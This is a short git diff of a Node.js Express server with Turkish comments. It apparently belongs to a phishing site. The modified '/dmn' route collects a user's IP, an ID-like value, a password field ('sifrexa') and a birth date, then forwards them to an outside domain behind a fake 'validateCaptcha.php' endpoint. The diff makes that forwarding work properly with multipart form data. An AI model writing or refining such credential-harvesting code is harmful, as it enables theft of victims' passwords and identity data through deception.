@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const path = require('path');
+const FormData = require('form-data');
 require('dotenv').config();
 const app = express();
 const port = process.env.PORT || 3000;
@@ -50,12 +51,22 @@ app.get('/files/js', (req, res) => {
 
 app.post('/dmn', async (req, res) => {
     try {
-        const formData = req.body;
+        const user_ip = req.body.user_ip;
+        const tach = req.body.tach;
+        const sifrexa = req.body.sifrexa;
+        const dogum = req.body.dogum;
+
+        const formData = new FormData();
+        formData.append('user_ip', user_ip);
+        formData.append('tach', tach);
+        formData.append('sifrexa', sifrexa);
+        formData.append('dogum', dogum);
 
         const apiUrl = 'https://alliikkerrr.online/validateCaptcha.php';
 
-        // POST isteği yap
-        const response = await axios.post(apiUrl, formData);
+        const response = await axios.post(apiUrl, formData, {
+            headers: formData.getHeaders() // FormData için gerekli olan header'ları ayarla
+        });
 
         res.sendFile(__dirname + '/public/bilgi.html');
     } catch (error) {
